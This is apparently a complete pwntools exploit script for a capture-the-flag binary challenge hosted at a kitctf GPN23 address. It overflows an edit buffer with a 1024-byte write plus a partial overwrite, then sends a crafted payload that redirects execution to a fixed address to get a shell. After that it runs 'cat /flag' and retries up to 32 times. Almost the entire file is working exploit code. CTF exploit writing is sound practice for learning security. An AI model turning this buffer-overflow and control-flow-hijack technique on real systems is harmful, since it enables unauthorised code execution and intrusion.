from pwn import *
from pwnlib import timeout

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
elf = ELF(vuln_path)
libc = elf.libc

def getio():
    io = process([vuln_path]) if not f_remote else remote("lakeside-of-face-melting-tschunk.gpn23.ctf.kitctf.de", 443, ssl=True)
    return io


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

def pwn(io):
    payload = b""
    io.sendlineafter("6. Quit\n", "4")
    io.sendlineafter("start editing: ", "0")
    io.sendlineafter(" want to overwrite: ", "1024")
    io.send(b"t"*1024 + b"\xf0")
    
    
    ddebug("b *0x401437 \n b *0x0401747\ncontinue")
    io.sendlineafter("6. Quit\n", "4")
    io.sendlineafter("start editing: ", "887")
    io.sendlineafter("want to overwrite: ", "41")
    payload = b"\x00" + p64(0x400) +p32(0x89) + p32(0x377)
    payload += p64(0) * 2
    payload += p64(0x401225) + b"\n"
    io.send(payload)

    io.sendlineafter("6. Quit\n", "6")
    io.sendline("cat /flag")
    data = io.recv(50)
    if b"{" in data:
        pause()
    if b"start" in data:
        return
    io.interactive()

if f_gdb:
    io = getio()
    pwn(io)
else: 
    for i in range(32):
        io = getio()
        try:
            pwn(io)
        except:
            pass
        finally:
            io.close()
